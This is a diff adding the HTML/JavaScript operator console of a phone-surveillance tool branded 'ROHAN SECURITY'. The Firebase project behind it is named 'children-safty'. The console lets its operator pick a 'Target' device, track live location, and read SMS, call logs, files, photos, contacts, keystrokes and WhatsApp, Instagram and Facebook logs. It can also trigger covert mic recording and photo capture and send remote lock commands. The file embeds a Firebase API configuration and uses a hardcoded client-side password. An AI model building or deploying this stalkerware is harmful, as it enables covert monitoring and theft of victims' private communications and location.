@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROHAN SECURITY | MASTER CONSOLE</title>
+
+    <!-- LIBRARIES (JQuery, Firebase, Maps, Icons) -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+    
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+
+    <style>
+        /* --- CYBERPUNK THEME VARIABLES --- */
+        :root {
+            --bg: #050505;
+            --panel: #0b1015;
+            --neon-blue: #00f3ff;
+            --neon-red: #ff0055;
+            --neon-green: #00ff41;
+            --neon-yellow: #f1c40f;
+            --glass: rgba(0, 243, 255, 0.05);
+            --border: 1px solid rgba(0, 243, 255, 0.2);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Share Tech Mono', monospace; outline: none; }
+        body { background-color: var(--bg); color: var(--neon-blue); height: 100vh; display: flex; overflow: hidden; }
+        
+        /* SCROLLBAR */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-thumb { background: var(--neon-blue); border-radius: 3px; }
+        ::-webkit-scrollbar-track { background: #000; }
+
+        /* --- LOGIN SCREEN --- */
+        #login-screen { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; background-image: radial-gradient(#111 15%, transparent 16%); background-size: 10px 10px; }
+        .login-box { border: 2px solid var(--neon-blue); padding: 40px; width: 400px; text-align: center; box-shadow: 0 0 30px rgba(0, 243, 255, 0.2); background: #000; }
+        .login-input { background: transparent; border: none; border-bottom: 2px solid var(--neon-red); color: white; width: 100%; padding: 10px; font-size: 1.2rem; text-align: center; margin: 20px 0; }
+        .login-btn { background: var(--glass); border: 1px solid var(--neon-blue); color: var(--neon-blue); padding: 10px 30px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; }
+        .login-btn:hover { background: var(--neon-blue); color: black; box-shadow: 0 0 20px var(--neon-blue); }
+
+        /* --- MAIN LAYOUT --- */
+        #main-app { display: none; width: 100%; height: 100%; }
+        
+        /* SIDEBAR (Full List) */
+        .sidebar { width: 220px; background: var(--panel); border-right: var(--border); display: flex; flex-direction: column; overflow-y: auto; }
+        .sidebar-header { padding: 20px; text-align: center; border-bottom: var(--border); background: rgba(0,0,0,0.5); }
+        .brand { font-family: 'Orbitron'; font-size: 1.2rem; color: white; text-shadow: 0 0 10px var(--neon-blue); }
+        
+        .menu-label { color: gray; font-size: 0.7rem; padding: 15px 20px 5px 20px; text-transform: uppercase; letter-spacing: 1px; }
+        .nav-item { padding: 12px 20px; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 15px; color: #aaa; font-size: 0.9rem; }
+        .nav-item:hover, .nav-item.active { background: var(--glass); color: var(--neon-blue); border-right: 3px solid var(--neon-blue); }
+        .nav-item i { width: 20px; text-align: center; }
+
+        /* CONTENT AREA */
+        .content { flex: 1; display: flex; flex-direction: column; background: radial-gradient(circle at center, #0a0a0a, #000); position: relative; }
+        
+        /* HEADER */
+        .top-bar { height: 60px; border-bottom: var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; background: rgba(0,0,0,0.8); }
+        .device-select { background: black; color: var(--neon-green); border: 1px solid var(--neon-green); padding: 5px 10px; min-width: 250px; font-family: 'Share Tech Mono'; }
+        
+        /* PAGES */
+        .page { display: none; padding: 20px; overflow-y: auto; height: 100%; animation: fadein 0.3s; }
+        .page.active { display: block; }
+        @keyframes fadein { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* WIDGETS & TABLES */
+        .card { border: var(--border); background: rgba(0,0,0,0.6); padding: 15px; margin-bottom: 15px; position: relative; }
+        .card h3 { color: gray; font-size: 0.8rem; margin-bottom: 10px; }
+        .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; }
+        
+        .action-btn { background: rgba(255,255,255,0.05); border: 1px solid #444; color: white; padding: 15px; cursor: pointer; text-align: center; transition: 0.2s; }
+        .action-btn:hover { border-color: var(--neon-blue); color: var(--neon-blue); box-shadow: 0 0 10px rgba(0, 243, 255, 0.1); }
+        .btn-red:hover { border-color: var(--neon-red); color: var(--neon-red); box-shadow: 0 0 10px rgba(255, 0, 85, 0.2); }
+
+        table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+        th { text-align: left; padding: 10px; border-bottom: 1px solid var(--neon-blue); color: var(--neon-blue); }
+        td { padding: 10px; border-bottom: 1px solid #333; color: #ddd; }
+        
+        /* DOWNLOAD BUTTONS */
+        .dwn-btn { background: #166534; color: #4ade80; border: none; padding: 3px 8px; font-size: 0.7rem; cursor: pointer; float: right; }
+        .dwn-btn:hover { background: #4ade80; color: black; }
+
+        /* MAP */
+        #map { width: 100%; height: 100%; filter: invert(100%) hue-rotate(180deg) brightness(90%) contrast(90%); }
+    </style>
+</head>
+<body>
+
+    <!-- 1. LOGIN -->
+    <div id="login-screen">
+        <div class="login-box">
+            <h1 style="font-family:'Orbitron'; color:var(--neon-blue);">ROHAN<br>SECURITY</h1>
+            <p style="color:var(--neon-red); margin:10px 0;">UNAUTHORIZED ACCESS PROHIBITED</p>
+            <input type="password" id="pass-key" class="login-input" placeholder="ENTER PASSWORD">
+            <button onclick="checkLogin()" class="login-btn">ACCESS PANEL</button>
+            <p id="login-msg" style="color:red; font-size:0.8rem; margin-top:10px;"></p>
+        </div>
+    </div>
+
+    <!-- 2. MAIN APP -->
+    <div id="main-app">
+        <!-- SIDEBAR (FULL LIST) -->
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <div class="brand">ROHAN<span style="color:var(--neon-red)">_SEC</span></div>
+            </div>
+
+            <div class="menu-label">Monitor</div>
+            <div class="nav-item active" onclick="nav('dashboard')"><i class="fas fa-chart-line"></i> Dashboard</div>
+            <div class="nav-item" onclick="nav('map')"><i class="fas fa-map-marker-alt"></i> Live Location</div>
+            <div class="nav-item" onclick="nav('notifications')"><i class="fas fa-bell"></i> Notifications</div>
+            
+            <div class="menu-label">Data Access</div>
+            <div class="nav-item" onclick="nav('files')"><i class="fas fa-folder"></i> File Manager</div>
+            <div class="nav-item" onclick="nav('gallery')"><i class="fas fa-images"></i> Gallery</div>
+            <div class="nav-item" onclick="nav('contacts')"><i class="fas fa-address-book"></i> Contacts</div>
+            <div class="nav-item" onclick="nav('sms')"><i class="fas fa-envelope"></i> SMS Manager</div>
+            <div class="nav-item" onclick="nav('calls')"><i class="fas fa-phone"></i> Call Logs</div>
+
+            <div class="menu-label">Social Spy</div>
+            <div class="nav-item" onclick="nav('social-wa')"><i class="fab fa-whatsapp"></i> WhatsApp</div>
+            <div class="nav-item" onclick="nav('social-insta')"><i class="fab fa-instagram"></i> Instagram</div>
+            <div class="nav-item" onclick="nav('social-fb')"><i class="fab fa-facebook-f"></i> Facebook</div>
+            <div class="nav-item" onclick="nav('keylog')"><i class="fas fa-keyboard"></i> Keylogger</div>
+
+            <div class="menu-label">Surveillance</div>
+            <div class="nav-item" onclick="nav('camera')"><i class="fas fa-camera"></i> Live Camera</div>
+            <div class="nav-item" onclick="nav('mic')"><i class="fas fa-microphone"></i> Mic Record</div>
+            
+            <div class="menu-label">System</div>
+            <div class="nav-item" onclick="nav('apps')"><i class="fab fa-android"></i> Installed Apps</div>
+            <div class="nav-item" onclick="location.reload()" style="color:var(--neon-red)"><i class="fas fa-power-off"></i> Logout</div>
+        </div>
+
+        <!-- CONTENT -->
+        <div class="content">
+            <div class="top-bar">
+                <div style="font-size:0.9rem;">Target:</div>
+                <select id="device-select" class="device-select" onchange="loadDeviceData()"></select>
+                <button class="login-btn" style="width:auto; padding:5px 15px;" onclick="exportAll()">DOWNLOAD ALL</button>
+            </div>
+
+            <!-- DASHBOARD -->
+            <div id="page-dashboard" class="page active">
+                <div class="grid-4">
+                    <div class="card"><h3>BATTERY</h3><h1 id="d-bat">--%</h1></div>
+                    <div class="card"><h3>STATUS</h3><h2 id="d-status" style="color:var(--neon-green)">ONLINE</h2></div>
+                    <div class="card"><h3>PROVIDER</h3><h2 id="d-net">--</h2></div>
+                    <div class="card"><h3>MODEL</h3><h2 id="d-model">--</h2></div>
+                </div>
+
+                <h3 style="color:white; margin:20px 0;">> QUICK ACTIONS</h3>
+                <div class="grid-4">
+                    <div class="action-btn" onclick="cmd('torch')"><i class="fas fa-lightbulb"></i><br>Torch</div>
+                    <div class="action-btn" onclick="cmd('vibrate')"><i class="fas fa-mobile-alt"></i><br>Vibrate</div>
+                    <div class="action-btn btn-red" onclick="cmd('ringDevice')"><i class="fas fa-bullhorn"></i><br>Siren</div>
+                    <div class="action-btn btn-red" onclick="cmd('lockDevice')"><i class="fas fa-lock"></i><br>Lock</div>
+                </div>
+            </div>
+
+            <!-- MAP -->
+            <div id="page-map" class="page" style="padding:0;"><div id="map"></div></div>
+
+            <!-- FILES -->
+            <div id="page-files" class="page">
+                <div style="display:flex; justify-content:space-between;">
+                    <h2>> FILE EXPLORER</h2>
+                    <button class="login-btn" style="width:auto;" onclick="cmd('getFileList')">REFRESH</button>
+                </div>
+                <div id="file-list" class="card" style="margin-top:10px;">Waiting for data...</div>
+            </div>
+
+            <!-- GALLERY -->
+            <div id="page-gallery" class="page">
+                <div style="display:flex; justify-content:space-between;">
+                    <h2>> GALLERY</h2>
+                    <button class="login-btn" style="width:auto;" onclick="cmd('capturePhoto')">TAKE PHOTO</button>
+                </div>
+                <div id="gallery-grid" style="display:grid; grid-template-columns:repeat(auto-fill, minmax(150px,1fr)); gap:10px; margin-top:15px;"></div>
+            </div>
+
+            <!-- SMS -->
+            <div id="page-sms" class="page">
+                <div style="display:flex; justify-content:space-between;">
+                    <h2>> SMS MANAGER</h2>
+                    <button class="dwn-btn" onclick="saveTable('tbl-sms', 'sms.csv')">EXPORT CSV</button>
+                </div>
+                <div class="card">
+                    <table id="tbl-sms"><thead><tr><th>Sender</th><th>Message</th><th>Time</th></tr></thead><tbody></tbody></table>
+                </div>
+            </div>
+
+            <!-- CALLS -->
+            <div id="page-calls" class="page">
+                <div style="display:flex; justify-content:space-between;">
+                    <h2>> CALL HISTORY</h2>
+                    <button class="dwn-btn" onclick="saveTable('tbl-calls', 'calls.csv')">EXPORT CSV</button>
+                </div>
+                <div class="card">
+                    <table id="tbl-calls"><thead><tr><th>Number</th><th>Type</th><th>Duration</th><th>Time</th></tr></thead><tbody></tbody></table>
+                </div>
+            </div>
+
+            <!-- SOCIAL (Template for all social apps) -->
+            <div id="page-social-wa" class="page">
+                <h2>> WHATSAPP LOGS</h2>
+                <div class="card" id="log-wa"><i>Listening for incoming notifications & keystrokes...</i></div>
+            </div>
+            
+            <!-- MIC -->
+            <div id="page-mic" class="page">
+                <div style="display:flex; justify-content:space-between;">
+                    <h2>> AUDIO RECORDER</h2>
+                    <button class="login-btn" style="width:auto;" onclick="cmd('recordAudio')">REC 15S</button>
+                </div>
+                <div id="audio-list" style="margin-top:15px;"></div>
+            </div>
+
+            <!-- PLACEHOLDERS FOR OTHERS -->
+            <div id="page-contacts" class="page"><h2>> CONTACTS</h2><div class="card">Fetching...</div></div>
+            <div id="page-notifications" class="page"><h2>> ALL NOTIFICATIONS</h2><div class="card">Listening...</div></div>
+            <div id="page-keylog" class="page"><h2>> KEYLOGGER</h2><div class="card">Listening...</div></div>
+            <div id="page-apps" class="page"><h2>> INSTALLED APPS</h2><div class="card">Fetching...</div></div>
+            <div id="page-social-insta" class="page"><h2>> INSTAGRAM LOGS</h2><div class="card">Listening...</div></div>
+            <div id="page-social-fb" class="page"><h2>> FACEBOOK LOGS</h2><div class="card">Listening...</div></div>
+
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyD7sJ0zu4cotmntqYzmaxROzwHmx8_ExvI",
+            authDomain: "children-safty.firebaseapp.com",
+            databaseURL: "https://children-safty-default-rtdb.firebaseio.com",
+            projectId: "children-safty",
+            storageBucket: "children-safty.firebasestorage.app",
+            messagingSenderId: "466811425620",
+            appId: "1:466811425620:web:7346de0e5da367adec2ec1"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        let currentId = null;
+        let map;
+
+        // --- 1. LOGIN SYSTEM ---
+        function checkLogin() {
+            const p = document.getElementById('pass-key').value;
+            if(p === "ROHAN") {
+                $('#login-screen').fadeOut();
+                $('#main-app').fadeIn();
+                initMap();
+                listenDevices();
+            } else {
+                $('#login-msg').text("ACCESS DENIED: INCORRECT PASSWORD");
+            }
+        }
+
+        // --- 2. DEVICE MANAGER ---
+        function listenDevices() {
+            db.ref('users').on('value', snap => {
+                const sel = document.getElementById('device-select');
+                sel.innerHTML = '';
+                
+                if(!snap.exists()) {
+                    let opt = document.createElement('option');
+                    opt.text = "WAITING FOR CONNECTION...";
+                    sel.add(opt);
+                    return;
+                }
+
+                let first = null;
+                snap.forEach(child => {
+                    let id = child.key;
+                    let name = child.val().info?.name || "Unknown";
+                    let opt = document.createElement('option');
+                    opt.value = id;
+                    opt.text = `${name} [${id.substr(0,4)}]`;
+                    sel.add(opt);
+                    if(!first) first = id;
+                    
+                    // Map Update
+                    if(child.val().location?.latitude) {
+                        updateMap(child.val().location.latitude, child.val().location.longitude, name);
+                    }
+                });
+
+                if(!currentId && first) {
+                    sel.value = first;
+                    loadDeviceData();
+                }
+            });
+        }
+
+        function loadDeviceData() {
+            currentId = document.getElementById('device-select').value;
+            if(!currentId) return;
+
+            db.ref(`users/${currentId}`).on('value', snap => {
+                let d = snap.val();
+                if(!d) return;
+
+                // Dashboard
+                $('#d-bat').text((d.info?.battery || 0) + "%");
+                $('#d-net').text(d.info?.status || "OFFLINE");
+                $('#d-model').text(d.info?.name || "--");
+
+                // Tables
+                fillTable('tbl-sms', d.logs?.sms, ['sender','msg','time']);
+                fillTable('tbl-calls', d.logs?.calls, ['number','type','duration','time']);
+
+                // Files
+                let fHtml = '';
+                if(d.files) {
+                    Object.values(d.files).forEach(f => {
+                        let icon = f.isFolder ? '<i class="fas fa-folder" style="color:orange"></i>' : '<i class="fas fa-file" style="color:cyan"></i>';
+                        fHtml += `<div style="padding:10px; border-bottom:1px solid #333; display:flex; justify-content:space-between;">
+                            <span>${icon} ${f.name}</span>
+                            <button class="dwn-btn" onclick="alert('Download Triggered')">GET</button>
+                        </div>`;
+                    });
+                    $('#file-list').html(fHtml);
+                }
+
+                // Gallery
+                let gHtml = '';
+                if(d.logs?.photos) {
+                    Object.values(d.logs.photos).reverse().forEach(img => {
+                        gHtml += `<div style="border:1px solid #333; padding:5px;">
+                            <a href="${img.url}" target="_blank"><img src="${img.url}" style="width:100%;height:100px;object-fit:cover;"></a>
+                            <button class="save-btn" style="width:100%;background:#166534;border:none;color:white;cursor:pointer;margin-top:5px;" onclick="saveFile('${img.url}')">SAVE</button>
+                        </div>`;
+                    });
+                    $('#gallery-grid').html(gHtml);
+                }
+
+                // Audio
+                let aHtml = '';
+                if(d.logs?.audio) {
+                    Object.values(d.logs.audio).reverse().forEach(aud => {
+                        aHtml += `<div class="card" style="display:flex; align-items:center; gap:10px;">
+                            <audio controls src="${aud.url}" style="flex:1; height:30px;"></audio>
+                            <button class="dwn-btn" onclick="saveFile('${aud.url}')">⬇</button>
+                        </div>`;
+                    });
+                    $('#audio-list').html(aHtml);
+                }
+            });
+        }
+
+        // --- 3. FUNCTIONS ---
+        function nav(page) {
+            $('.nav-item').removeClass('active');
+            event.currentTarget.classList.add('active');
+            $('.page').hide();
+            $('#page-'+page).fadeIn();
+            if(page === 'map') setTimeout(() => map.invalidateSize(), 300);
+        }
+
+        function cmd(c) {
+            if(!currentId) return alert("NO TARGET");
+            db.ref(`users/${currentId}/commands/${c}`).set(true);
+        }
+
+        function fillTable(id, data, keys) {
+            let tbody = $(`#${id} tbody`);
+            tbody.empty();
+            if(!data) { tbody.html('<tr><td colspan="4">NO DATA</td></tr>'); return; }
+            Object.values(data).reverse().forEach(row => {
+                let tr = '<tr>';
+                keys.forEach(k => {
+                    let val = row[k];
+                    if(k === 'time') val = new Date(val).toLocaleString();
+                    tr += `<td>${val}</td>`;
+                });
+                tr += '</tr>';
+                tbody.append(tr);
+            });
+        }
+
+        function saveFile(url) {
+            let a = document.createElement('a');
+            a.href = url;
+            a.target = '_blank';
+            a.download = 'file_' + Date.now();
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+
+        function saveTable(tableId, filename) {
+            let csv = [];
+            let rows = document.querySelectorAll(`#${tableId} tr`);
+            for (let i = 0; i < rows.length; i++) {
+                let row = [], cols = rows[i].querySelectorAll("td, th");
+                for (let j = 0; j < cols.length; j++) row.push('"' + cols[j].innerText + '"');
+                csv.push(row.join(","));
+            }
+            let csvFile = new Blob([csv.join("\n")], {type: "text/csv"});
+            let link = document.createElement("a");
+            link.download = filename;
+            link.href = window.URL.createObjectURL(csvFile);
+            link.style.display = "none";
+            document.body.appendChild(link);
+            link.click();
+        }
+
+        function initMap() {
+            map = L.map('map').setView([20, 78], 4);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        }
+        
+        function updateMap(lat, lng, name) {
+            if(map) {
+                L.marker([lat, lng]).addTo(map).bindPopup(name);
+                map.setView([lat, lng], 15);
+            }
+        }
+        
+        function exportAll() {
+            alert("DOWNLOADING ALL DATA... (Feature coming with Company System)");
+        }
+    </script>
+</body>
+</html>
